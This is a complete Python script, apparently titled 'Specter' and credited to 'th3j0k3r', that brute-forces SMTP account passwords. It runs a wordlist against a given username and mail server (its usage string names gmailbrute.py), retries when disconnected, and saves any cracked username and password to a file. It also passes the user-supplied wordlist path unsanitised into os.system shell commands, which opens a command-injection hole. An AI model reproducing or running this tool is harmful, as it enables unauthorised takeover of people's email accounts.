#!/usr/bin/python

import os
import time
import smtplib
import argparse
import fileinput
from colorama import Fore,Back,Style


def banner():
	os.system('clear')
	print(Fore.GREEN + """


                                                                          
      _/_/_/                                  _/                          
   _/        _/_/_/      _/_/      _/_/_/  _/_/_/_/    _/_/    _/  _/_/   
    _/_/    _/    _/  _/_/_/_/  _/          _/      _/_/_/_/  _/_/        
       _/  _/    _/  _/        _/          _/      _/        _/           
_/_/_/    _/_/_/      _/_/_/    _/_/_/      _/_/    _/_/_/  _/            
         _/                                                               
        _/                                                                

                     Created by th3j0k3r
	_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/

""")


#
# begin the crack
#
def begin ():
	banner()

	try:

		# Create the smtp server.
		bruteforce()
	except KeyboardInterrupt:
		print(Fore.GREEN + "[*] Exiting Program..")
		return

#
# The bruteforce algorithm
#
def bruteforce():
	
	try:
		# Check if the wordlist exists
		if (os.path.isfile(args.w) == False):
			print(Fore.RED + "[!] Wordlist does not exist")
			return


		#
		# Do some magic to split the wordlist.ssss
		#
		print(Fore.WHITE + "[**] Splitting wordlist into smaller chunks..")		
		time.sleep(2)

		if (os.path.exists("wordlists") == False): 
		    os.system("mkdir wordlists")
		else:
		    os.system('rm -r wordlists')
		    os.system("mkdir wordlists")

		os.system("cp " + args.w + " wordlists/")
		os.system("cd wordlists/ && split -l 10 " + args.w)
		os.system("cd wordlists/ && rm " + args.w)

		# Check to see if the wordlist exists.
		if (os.path.exists("wordlists")):
			
			for filename in os.listdir("wordlists"):

				# iterate through each line.
				for line in fileinput.input("wordlists/" + filename):
					password = format(line.strip())
					
					# Setup smtp object
					smtp = smtplib.SMTP(args.s, args.p)
					smtp.starttls()

					# Print the attempts
					print(Fore.WHITE + "----------------------------------------------------------") 
					print(Fore.WHITE + "[+] Trying " + Fore.YELLOW + "'" + password + "'"  + Fore.WHITE + " against " + Fore.WHITE + args.u) 
					print(Fore.WHITE + "----------------------------------------------------------") 
					try:
						time.sleep(args.t)
						try:

							# Attempt to login.
							smtp.login(args.u, password)	

						except smtplib.SMTPServerDisconnected:
							print(Fore.YELLOW + "[+] Server disconnected waiting 5 secs..")
							time.sleep(5)
							# setup the smtp object and Attempt to login again.
							smtp = smtplib.SMTP(args.s, args.p)
							smtp.starttls()
							smtp.login(args.u, password)	
							continue
		

						# Write the cracked password to a file.
						f = open('passwords/' + args.u, 'w')
						f.write('username: '  + args.u + '\n')
						f.write('password: ' + password + '\n')
						f.close()

						# Print thhe username & password out to the terminal.
						print(Fore.WHITE + "====================================================================")
						print(Fore.WHITE + "[*] Found it!, " + Fore.WHITE + "username: " + Fore.GREEN + args.u + Fore.WHITE + " password: " + Fore.GREEN + password)
						print(Fore.WHITE + "====================================================================")
						smtp.quit()	
						return
					except smtplib.SMTPAuthenticationError:
						print(Fore.RED + "[!] Password incorrect")

		else:
			print(Fore.RED + "[!] The wordlist does not exist")
	except KeyboardInterrupt:
		print(Fore.GREEN + "[*] Exiting Program..")
		return

# Arguments
def Args ():

	# Create the arguments.
	parser = argparse.ArgumentParser(description="Brute forces SMTP Passwords")
	required_args = parser.add_argument_group('Required Arguments')
	required_args.add_argument('--username', dest='u',  type=str, required=True)
	required_args.add_argument('--wordlist', dest='w',  type=str, required=True)
	required_args.add_argument('--server',   dest='s',  type=str, required=True)
	required_args.add_argument('--port',     dest='p',  type=int, required=True)
	required_args.add_argument('--timeout',     dest='t',  type=float, required=True)


	global args
	args = parser.parse_args()


	if args.u != None and args.w != None and args.s != None and args.p != None and args.t != None:
		begin()
	else:
		print("Please specify python gmailbrute.py -h for more options")

Args()
